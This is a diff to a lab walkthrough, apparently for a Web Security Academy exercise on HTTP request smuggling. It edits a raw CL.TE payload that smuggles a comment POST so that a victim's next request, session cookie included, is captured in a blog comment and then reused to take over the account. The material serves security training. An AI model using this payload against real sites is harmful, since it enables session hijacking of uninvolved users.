@@ -195,11 +195,11 @@ csrf=YOUR-CSRF-TOKEN&username=carlos
 
 ### Content-Length Capture victim requests
 
->Sending a POST request with smuggled request but the content length is longer than the real length and when victim browse their cookie session value is posted to blob comment. Increased the comment-post request's Content-Length to 850, then smuggle it to the back-end server.
+>Sending a POST request with smuggled request but the content length is longer than the real length and when victim browse their cookie session value is posted to blob comment. Increased the comment-post request's Content-Length to **798**, then smuggle POST request to the back-end server.
 
 ```html
 POST / HTTP/1.1
-Host: 0af8006004fb07f5c46a3c4600b20065.web-security-academy.net
+Host: TARGET.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 242
 Transfer-Encoding: chunked
@@ -209,14 +209,16 @@ Transfer-Encoding: chunked
 POST /post/comment HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 798
-Cookie: session=rmK9dkBeR1V3lg2bCgjfOkyBxImZMb6P
+Cookie: session=HackerCurrentCookieValue
 
-csrf=nVFjkw2QdI4G6hDY9nW39x0KOtFebyAd&postId=8&name=c&email=c%40c.c&website=&comment=c
-```
+csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
+```  
   
 ![Exploiting HTTP request smuggling with content-length value](content-length-capture-victim-request.png)  
 
->View the blog **post** to see if there's a comment containing a user's request. Note that once the victim user browses the target website, then only will the attack be successful. Copy the user's Cookie header from the blog post comment, and use the cookie to access victim's account.
+<sub>No new line at end of the smuggled POST request above^^ </sub>  
+
+>View the blog **post** to see if there's a comment containing a user's request. Note that once the victim user browses the target website, then only will the attack be successful. Copy the user's Cookie header from the blog post comment, and use the cookie to access victim's account.  
   
 ![Exploiting HTTP request smuggling to capture other users' requests](victim-request-captured-blog-comment.png)  
 
